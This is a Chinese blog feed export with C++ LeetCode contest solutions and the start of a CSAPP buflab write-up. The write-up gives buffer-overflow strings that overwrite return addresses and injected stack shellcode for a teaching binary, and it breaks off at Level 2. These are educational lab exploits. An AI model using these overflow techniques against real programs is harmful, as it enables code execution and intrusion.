class="number">3</span>);  <span class="comment">// [1, 3, 2]</span></span><br><span class="line">q.pushMiddle(<span class="number">4</span>);  <span class="comment">// [1, 4, 3, 2]</span></span><br><span class="line">q.popFront();     <span class="comment">// 返回 1 -&gt; [4, 3, 2]</span></span><br><span class="line">q.popMiddle();    <span class="comment">// 返回 3 -&gt; [4, 2]</span></span><br><span class="line">q.popMiddle();    <span class="comment">// 返回 4 -&gt; [2]</span></span><br><span class="line">q.popBack();      <span class="comment">// 返回 2 -&gt; []</span></span><br><span class="line">q.popFront();     <span class="comment">// 返回 -1 -&gt; [] （队列为空）</span></span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>1 &lt;= val &lt;= 109</code></li><li>最多调用 1000 次 <code>pushFront</code>， <code>pushMiddle</code>， <code>pushBack</code>， <code>popFront</code>， <code>popMiddle</code> 和 <code>popBack</code> 。</li></ul><h3 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/contest/biweekly-contest-40/problems/design-front-middle-back-queue/" target="_blank" rel="noopener">https://leetcode-cn.com/contest/biweekly-contest-40/problems/design-front-middle-back-queue/</a></p><h3 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 两个队列或者双向链表</p><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><ol><li>首先想到的就是双向链表，每次保存最中间的节点，需要<code>pop</code>或者<code>push</code>数据时，将中间节点删掉，同时将指针往前或者往后移动一位即可。</li><li>当然链表的操作还是太麻烦了，我们可以用两个双端队列来保存全部队列的值，其中<code>queue1</code>保存前半段，<code>queue2</code>保存后半段。</li></ol><ul><li><code>push_front,pop_front</code>： 我们直接从<code>queue1</code>中进行<code>push,pop</code>操作即可，当然<code>queue1</code>为空时，则<code>pop</code>需要从<code>queue2</code>中进行即可。</li><li><code>push_back,pop_back</code>： 我们直接从<code>queue2</code>中进行<code>push,pop</code>操作即可，当然<code>queue2</code>为空时，则<code>pop</code>需要从<code>queue1</code>中进行即可。</li><li><code>push_middle,pop_middle</code>: 我们首先需要将<code>queue1,queue2</code>的长度线性调整为平衡即可，则此时<code>push</code>时我们往<code>queue1</code>进行<code>push_back</code>即可；<code>pop</code>时，我们从<code>queue2</code>进行<code>pop_back</code>即可，这样刚好能够保证在正中间进行操作。<h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FrontMiddleBackQueue</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">deque</span>&lt;<span class="keyword">int</span>&gt; pq1;</span><br><span class="line">    <span class="built_in">deque</span>&lt;<span class="keyword">int</span>&gt; pq2;</span><br><span class="line">    FrontMiddleBackQueue() &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">pushFront</span><span class="params">(<span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">        pq1.push_front(val);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">pushMiddle</span><span class="params">(<span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = pq1.size() + pq2.size();</span><br><span class="line">        <span class="keyword">int</span> mid = n/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">while</span>(pq1.size() &gt; mid)&#123;</span><br><span class="line">            pq2.push_front(pq1.back());</span><br><span class="line">            pq1.pop_back();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(pq1.size() &lt; mid)&#123;</span><br><span class="line">            pq1.push_back(pq2.front());</span><br><span class="line">            pq2.pop_front();</span><br><span class="line">        &#125;</span><br><span class="line">        pq1.push_back(val);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">pushBack</span><span class="params">(<span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">        pq2.push_back(val);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">popFront</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> val = <span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(pq1.empty() &amp;&amp; pq2.empty()) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span>(pq1.empty())&#123;</span><br><span class="line">            val = pq2.front();</span><br><span class="line">            pq2.pop_front();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            val = pq1.front();</span><br><span class="line">            pq1.pop_front();</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> val;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">popMiddle</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = pq1.size() + pq2.size();</span><br><span class="line">        <span class="keyword">int</span> mid = n/<span class="number">2</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(pq1.empty() &amp;&amp; pq2.empty()) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">while</span>(pq1.size() &gt; mid)&#123;</span><br><span class="line">            pq2.push_front(pq1.back());</span><br><span class="line">            pq1.pop_back();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(pq1.size() &lt; mid)&#123;</span><br><span class="line">            pq1.push_back(pq2.front());</span><br><span class="line">            pq2.pop_front();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(n%<span class="number">2</span> == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">int</span> val = pq1.back();</span><br><span class="line">            pq1.pop_back();</span><br><span class="line">            <span class="keyword">return</span> val;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">int</span> val = pq2.front();</span><br><span class="line">            pq2.pop_front();</span><br><span class="line">            <span class="keyword">return</span> val;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">popBack</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> val = <span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(pq1.empty() &amp;&amp; pq2.empty()) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span>(pq2.empty())&#123;</span><br><span class="line">            val = pq1.back();</span><br><span class="line">            pq1.pop_back();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            val = pq2.back();</span><br><span class="line">            pq2.pop_back();</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> val;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your FrontMiddleBackQueue object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * FrontMiddleBackQueue* obj = new FrontMiddleBackQueue();</span></span><br><span class="line"><span class="comment"> * obj-&gt;pushFront(val);</span></span><br><span class="line"><span class="comment"> * obj-&gt;pushMiddle(val);</span></span><br><span class="line"><span class="comment"> * obj-&gt;pushBack(val);</span></span><br><span class="line"><span class="comment"> * int param_4 = obj-&gt;popFront();</span></span><br><span class="line"><span class="comment"> * int param_5 = obj-&gt;popMiddle();</span></span><br><span class="line"><span class="comment"> * int param_6 = obj-&gt;popBack();</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure></li></ul></blockquote><h2 id="5559-得到山形数组的最少删除次数"><a href="#5559-得到山形数组的最少删除次数" class="headerlink" title="5559. 得到山形数组的最少删除次数"></a>5559. 得到山形数组的最少删除次数</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><p>我们定义 arr 是 山形数组 当且仅当它满足：</p><ul><li><code>arr.length &gt;= 3</code></li><li>存在某个下标 i （从 0 开始） 满足 0 &lt; i &lt; arr.length - 1 且：</li></ul><ul><li><ul><li><code>arr[0] &lt; arr[1] &lt; ... &lt; arr[i - 1] &lt; arr[i]</code></li></ul></li></ul><ul><li><ul><li><code>arr[i] &gt; arr[i + 1] &gt; ... &gt; arr[arr.length - 1]</code><br>给你整数数组 nums​ ，请你返回将 nums 变成 山形状数组 的​ 最少 删除次数。</li></ul></li></ul><p>示例 1：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">1</span>,<span class="number">3</span>,<span class="number">1</span>]</span><br><span class="line">输出：<span class="number">0</span></span><br><span class="line">解释：数组本身就是山形数组，所以我们不需要删除任何元素。</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>]</span><br><span class="line">输出：<span class="number">3</span></span><br><span class="line">解释：一种方法是将下标为 <span class="number">0</span>，<span class="number">1</span> 和 <span class="number">5</span> 的元素删除，剩余元素为 [<span class="number">1</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">1</span>] ，是山形数组。</span><br></pre></td></tr></table></figure><br>示例 3：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>]</span><br><span class="line">输出：<span class="number">4</span></span><br><span class="line">提示：</span><br><span class="line"></span><br><span class="line">输入：nums = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>]</span><br><span class="line">输出：<span class="number">1</span></span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>3 &lt;= nums.length &lt;= 1000</code></li><li><code>1 &lt;= nums[i] &lt;= 109</code></li><li>题目保证 <code>nums</code> 删除一些元素后一定能得到山形数组。</li></ul><h3 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/minimum-initial-energy-to-finish-tasks" target="_blank" rel="noopener">https://leetcode-cn.com/problems/minimum-initial-energy-to-finish-tasks</a></p><h3 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 动态规划</p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ol><li>这个题目没有任何意义，非常简单的<code>dp</code>,<code>dpl[i]</code>代表从以<code>nums[i]</code>为结尾，前<code>i</code>个元素构成的最长的递增子序列的长度，<code>dpr[i]</code>代表从以<code>nums[i]</code>为结尾，后<code>n-i</code>个元素构成的最长的递增子序列的长度.非常简单的<code>dp</code>.<script type="math/tex; mode=display">ans = max(ans,n-(dpl[i] + dpr[i] - 1)) \qquad i \in[1,n-2]</script><h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">minimumMountainRemovals</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.size();</span><br><span class="line">        <span class="keyword">int</span> ans = n;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; dpl(n,<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; dpr(n,<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; i; ++j)&#123;</span><br><span class="line">                <span class="keyword">if</span>(nums[i] &gt; nums[j])&#123;</span><br><span class="line">                    dpl[i] = max(dpl[i],dpl[j] + <span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = n<span class="number">-1</span>; i &gt;= <span class="number">0</span>; --i)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = n<span class="number">-1</span>; j &gt; i; --j)&#123;</span><br><span class="line">                <span class="keyword">if</span>(nums[i] &gt; nums[j])&#123;</span><br><span class="line">                    dpr[i] = max(dpr[i],dpr[j] + <span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n<span class="number">-1</span>; ++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(dpl[i] &gt; <span class="number">1</span> &amp;&amp; dpr[i] &gt; <span class="number">1</span>) ans = min(ans,n-(dpl[i]+dpr[i]<span class="number">-1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id><a href="#" class="headerlink" title="#"></a>#</h2><p>欢迎关注和打赏，感谢支持！</p><ul><li>关注我的博客: <a href="http://mikemeng.org/" target="_blank" rel="noopener">http://mikemeng.org/</a></li><li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu" target="_blank" rel="noopener">https://www.zhihu.com/people/da-hua-niu</a></li><li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;leetcode-biweekl-contest-40&quot;&gt;&lt;a href=&quot;#leetcode-biweekl-contest-40&quot; class=&quot;headerlink&quot; title=&quot;leetcode  biweekl contest 40&quot;&gt;&lt;/a&gt;leetcode  biweekl contest 40&lt;/h1&gt;&lt;p&gt;今天的双周赛的题目实在是太简单了，基本上完全没有任何难度，除了题目麻烦容易出错以外，真心特别简单，基本上没有&lt;code&gt;hard&lt;/code&gt;难度，题目太没有诚意了,天冷了写代码速度都变慢了。&lt;br&gt;&lt;img src=&quot;https://i.loli.net/2020/11/28/UL9NKgnJsk78THv.png&quot; alt=&quot;1&quot;&gt;&lt;/p&gt;&lt;h2 id=&quot;5557-最大重复子字符串&quot;&gt;&lt;a href=&quot;#5557-最大重复子字符串&quot; class=&quot;headerlink&quot; title=&quot;5557. 最大重复子字符串&quot;&gt;&lt;/a&gt;5557. 最大重复子字符串&lt;/h2&gt;&lt;h3 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h3&gt;&lt;p&gt;给你一个字符串 &lt;code&gt;sequence&lt;/code&gt;，如果字符串 &lt;code&gt;word&lt;/code&gt; 连续重复&lt;code&gt;k&lt;/code&gt;次形成的字符串是 &lt;code&gt;sequence&lt;/code&gt; 的一个子字符串，那么单词&lt;code&gt;word&lt;/code&gt; 的 重复值为 k 。单词 word 的 最大重复值 是单词 &lt;code&gt;word&lt;/code&gt;在 &lt;code&gt;sequence&lt;/code&gt; 中最大的重复值。如果 &lt;code&gt;word&lt;/code&gt;不是 &lt;code&gt;sequence&lt;/code&gt;的子串，那么重复值 k 为 0 。&lt;/p&gt;
    
    </summary>
    
    
      <category term="算法" scheme="http://yoursite.com/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="leetcode" scheme="http://yoursite.com/tags/leetcode/"/>
    
  </entry>
  
  <entry>
    <title>【CSAPP】 Lab3</title>
    <link href="http://yoursite.com/2020/11/26/229/"/>
    <id>http://yoursite.com/2020/11/26/229/</id>
    <published>2020-11-26T05:57:44.757Z</published>
    <updated>2020-11-26T07:52:41.244Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CSAPP-lab3-bufboomb"><a href="#CSAPP-lab3-bufboomb" class="headerlink" title="CSAPP lab3 bufboomb"></a>CSAPP lab3 bufboomb</h1><p>本次实验的<code>project</code>为<code>buflab</code>，这个<code>lab</code>比上次<code>lab2</code>有意思多了，上次主要是读汇编代码太恶心了点，许多太难理解了。这次的<code>lab</code>主要为详细描述缓冲区溢出的<code>shellcode</code>编写，每个小的<code>case</code>非常有意思，花了差不多大概四天的时间，利用每天晚上的时间，终于把五个<code>case</code>全部通过，通过这<code>5</code>个<code>case</code>基本熟悉了<code>shellcode</code>的编写和缓冲区溢出的攻击原理，本质是利用堆栈模型的漏洞，利用函数返回值的跳转来进行不同的跳转。</p><a id="more"></a><ul><li>首先我们需要了解程序的调用过程和基本的汇编命令的指令的原理：</li></ul><ol><li><code>call</code> 指令的执行原理：<code>Call address</code>,将下一条指令的地址入栈，然后跳转到<code>address</code>对应的指令。<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">push</span> [next]</span><br><span class="line"><span class="keyword">jmp</span> address</span><br></pre></td></tr></table></figure></li><li><code>ret</code>指令的执行原理，<code>ret</code>将栈顶的数据出栈送入到<code>eip</code>寄存器，然后进行跳转。<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pop</span> %eip,</span><br><span class="line"><span class="keyword">jmp</span></span><br></pre></td></tr></table></figure></li><li>堆栈中<code>procedure</code>的调用的基本过程，将被调用的函数的参数从右至左依次入栈;将下一条指令入栈，跳转到函数进行执行;进入到被执行的函数时，首先会将当前的<code>ebp</code>入栈。<br><img src="https://i.loli.net/2020/11/26/DFieZPoyp7hnsW4.png" alt="1"><br>搞清楚以上三点的信息后，对这<code>5</code>个<code>case</code>就能非常熟悉和了解了。</li></ol><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>关于<code>getbuf</code>函数的原型:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Buffer size for getbuf */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NORMAL_BUFFER_SIZE 32</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getbuf</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[NORMAL_BUFFER_SIZE];</span><br><span class="line">    Gets(buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>我们可以看到<code>getbuf</code>函数中栈上的申请的字符串的长度为<code>32</code>，我们缓冲区的溢出的原理也是对<code>buf</code>的空间进行连续的填充，直到将<code>getbuf</code>函数的返回指令的地址用我们自定义的地址进行覆盖，从而执行完<code>getbuf</code>函数后，在返回时将会跳转到我们所需要的地址即可。我们同时仔细分析一下<code>getbuf</code>函数的汇编代码如下：<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">080491f</span>4 &lt;getbuf&gt;:</span><br><span class="line"> <span class="number">80491f</span>4:       <span class="number">55</span>                      push   %ebp</span><br><span class="line"> <span class="number">80491f</span>5:       <span class="number">89</span> e5                   mov    %esp,%ebp</span><br><span class="line"> <span class="number">80491f</span>7:       <span class="number">83</span> ec <span class="number">38</span>                sub    $<span class="number">0x38</span>,%esp</span><br><span class="line"> <span class="number">80491f</span>a:       <span class="number">8</span>d <span class="number">45</span> d8                lea    <span class="number">-0x28</span>(%ebp),%eax</span><br><span class="line"> <span class="number">80491f</span>d:       <span class="number">89</span> <span class="number">04</span> <span class="number">24</span>                mov    %eax,(%esp)</span><br><span class="line"> <span class="number">8049200</span>:       e8 f5 fa ff ff          call   <span class="number">8048</span>cfa &lt;Gets&gt;</span><br><span class="line"> <span class="number">8049205</span>:       b8 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          mov    $<span class="number">0x1</span>,%eax</span><br><span class="line"> <span class="number">804920</span>a:       c9                      leave</span><br><span class="line"> <span class="number">804920b</span>:       c3                      ret</span><br></pre></td></tr></table></figure><br>从汇编代码中可以知道<code>buff</code>的偏移地址第<code>(0x28 + 8)</code>存储的为函数返回地址，所以我们只需要将<code>offset = (0x28 + 8)</code>的空间进行自定义填充即可，以下所有的题目基本上都类似的原理。</p><h3 id="1-Level-0-Candle"><a href="#1-Level-0-Candle" class="headerlink" title="1. Level 0: Candle"></a>1. Level 0: Candle</h3><ul><li>题目非常简单，只是要求能够正确执行函数<code>smoke</code>即可，我们只需要将<code>smoke</code>函数的地址写入<code>getbuf</code>的返回地址即可,我们只需要将<code>08048c18</code>写入返回地址即可。<br><img src="https://i.loli.net/2020/11/26/nJHl9QcwD3qMUzT.png" alt="1"><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">18</span> <span class="number">8</span>c <span class="number">04</span> <span class="number">08</span></span><br></pre></td></tr></table></figure><h3 id="2-Level-1-Sparkler"><a href="#2-Level-1-Sparkler" class="headerlink" title="2. Level 1: Sparkler"></a>2. Level 1: Sparkler</h3></li><li>题目非常简单，只是要求能够正确执行函数<code>fizz</code>即可，我们只需要将<code>fizz</code>函数的地址写入<code>getbuf</code>的返回地址即可,我们只需要将<code>08048c18</code>写入返回地址即可,与<code>level1</code>不一样的是还需要把参数<code>val</code>参数传入，并且此时参数的值为<code>cookie</code>的值，我们知道参数的偏移地址<code>offset = (0x28 + 12)</code>，我们只需要在此偏移处填入<code>cookie</code>的值即可。<br><img src="https://i.loli.net/2020/11/26/3W4eXo6zNFVnSCO.png" alt="2"><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">42</span> <span class="number">8</span>c <span class="number">04</span> <span class="number">08</span> <span class="number">08</span> d1 <span class="number">08</span> <span class="number">04</span> <span class="number">00</span></span><br></pre></td></tr></table></figure><h3 id="3-Level-2-Firecracker"><a href="#3-Level-2-Firecracker" class="headerlink" title="3.Level 2: Firecracker"></a>3.Level 2: Firecracker</h3></li><li>这个稍微复杂点，只是要求能够正确执行函数<code>bang</code>，并且要求<code>global_value</code>的值与<code>cookie</code>的值相等，这就要求我们不仅返回执行<code>bang</code>函数，还需要对<code>global_value</code>的值进行更改。此题需要在栈上写入指令，并且执行栈上的指令修改全局变量的值，执行完成后跳转到<code>bang</code>函数即可。</li><li>我们通过C语言写入汇编代码，然后进行编译翻译成机器指令即可，再将填入到栈中即可，需要执行的指令如下：<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm__(<span class="string">"mov $0x6830c384, %eax"</span>); <span class="comment">// eax = cookie</span></span><br><span class="line">    __asm__(<span class="string">"mov %eax,0x804d100"</span>);    <span class="comment">// global_value = cookie</span></span><br><span class="line">    __asm__(<span class="string">"push $0x08048c9d"</span>);      <span class="comment">// set bang return address</span></span><br><span class="line">    __asm__(<span class="string">"ret"</span>);    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2020/11/26/gzNHyfrudtTAWpq.png" 